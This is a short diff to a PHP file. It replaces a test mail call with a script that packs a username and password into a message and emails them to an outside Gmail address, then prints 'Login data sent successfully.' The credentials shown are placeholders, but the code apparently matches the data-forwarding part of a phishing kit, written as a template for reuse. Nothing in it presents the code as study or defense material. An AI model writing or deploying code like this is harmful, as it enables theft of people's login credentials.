@@ -1,12 +1,21 @@
-$to = 'jhonkonum@gmail.com';
+<?php
+// Sample login data
+$data = [
+    'username' => 'exampleUser',
+    'password' => 'examplePass'
+];
 
-$subject = 'test';
+// Convert data to a message
+$message = "Username: " . $data['username'] . "\nPassword: " . $data['password'];
 
-$body = 'test';
+// Recipient email (your Gmail address)
+$to = 'jhonkonum@gmail.com'; // Replace with your Gmail ID
+$subject = 'Agaya Agaya Data Agaya';
 
-$header  = 'MIME-Version: 1.0' . "\r\n";
-$header .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
-$header .= "To: <$to>" . "\r\n";
-$header .= 'From: from@mail.com \r\n';
-
-mail($to, $subject, $body, $header);
+// Send the email
+if (mail($to, $subject, $message)) {
+    echo 'Login data sent successfully.';
+} else {
+    echo 'Failed to send login data.';
+}
+?>
